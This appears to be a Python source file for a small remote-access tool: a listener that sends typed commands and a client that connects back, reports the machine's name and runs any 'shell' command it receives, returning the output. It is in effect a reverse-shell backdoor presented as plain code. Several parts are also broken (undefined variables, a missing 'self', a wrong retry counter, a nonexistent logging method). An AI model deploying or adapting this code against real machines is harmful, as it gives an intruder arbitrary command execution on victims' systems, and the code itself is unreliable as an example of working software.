import sys, os, os.path, logging
import socket, subprocess, re, time

class Server:

    def __init__(self, host = '0.0.0.0', port = 58777, attempts = 10):
        self.host = host
        self.port = port
        self.attempts = attempts
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = None
        self.addr = None
        self.hostname = None
        self.log = Logger('server', output='file,print')

    def listen(self, attempt=1):
        try:
            self.log.info("Listening on Port %s (Attempt %d)" % (self.port, attempt))
            self.s.bind((self.host, self.port))
            self.s.listen(1)
        except socket.error as msg:
            self.log.error('Socket Binding Error:', msg[0], file=sys.stderr)
            if attempt < self.attempts: 
                self.log.info('Retrying...', file=sys.stderr)
                self.listen(attempt= + 1)

    def accept(self):
        try:
            self.conn, self.addr = self.s.accept()
            self.log.success('Session Opened at %s:%s' % (self.addr[0], self.addr[1]))
            self.hostname = self.conn.recv(1024)
            self.prompt()
            self.log.warning('Session Closed at %s:%s' % (self.addr[0], self.addr[1]))
        except socket.error as msg:
            self.log.error('Socket Accepting Error:', msg[0], file=sys.stderr)            

    def prompt(self):
        while True:
            cmd = input(str(self.addr[0]) + '@' + str(self.hostname) + '>> ')
            if cmd == 'quit':
                self.conn.close()
                self.s.close()
                return
            command = self.conn.send(cmd)
            result = self.conn.recv(16834)
            if result != self.hostname:
                print(result)

class Client:

    def __init__(self, host, port = 58777):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = host
        self.port = int(port)
        self.log = Logger('client', output='file,print')
        self.log.info('Connecting to %s:%s' % (self.host, self.port))   

    def connect(self):
        try:
            self.s.connect((host, port))
            self.log.success('Connection Established')
            self.s.send(os.environ['COMPUTERNAME'])
        except:
            time.sleep(2)
            self.connect()

    def receive(self):
        received = self.s.recv(1024)
        tokens = re.split('\s+', received, 1)
        command = tokens[0]
        if command == 'quit':
            self.s.close()
        elif command == 'shell':
            if len(tokens) > 1:
                proc2 = subprocess.Popen(tokens[1], shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE)
                output = proc2.stdout.read() + proc2.stderr.read()
                if len(output) == 0:
                    output = '[!] Command Returned Empty Response'
            else:
                output = '[!] Arguments must follow "shell"'
        else:
            output = '[x] Unknow Command. Expecting "quit" or "shell <cmd>" (e.g. "shell dir")'
        self.send(output)

    def send(self, output):
        self.s.send(output)
        self.receive()

    def stop():
        self.log.warning('Terminating Connection to %s:%s' % (host, port))
        self.s.close()

class Logger():

    def __init__(self, name, level = logging.INFO, output = 'file'):
        self.logger  = logging.getLogger(name)
        self.logger.setLevel(level)
        self.output = [mode.strip() for mode in output.split(',')]

        if 'file' in self.output:
            self.handler = logging.FileHandler(f'{name}.log')
            self.handler.setLevel(level)

            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            self.handler.setFormatter(formatter)

            self.logger.addHandler(self.handler)

    def info(self, msg):
        self.logger.info(msg)
        if 'print' in self.output:
            sym = '*'
            print(f'[{sym}] {msg}')

    def success(self, msg):
        self.logger.success(msg)
        if 'print' in self.output:
            sym = chr(10004)
            print(f'[{sym}] {msg}')

    def error(self, msg):
        self.logger.error(msg)
        if 'print' in self.output:
            sym = chr(10006)
            print(f'[{sym}] {msg}')

    def warning(self, msg):
        self.logger.warning(msg)
        if 'print' in self.output:
            sym = '!'
            print(f'[{sym}] {msg}')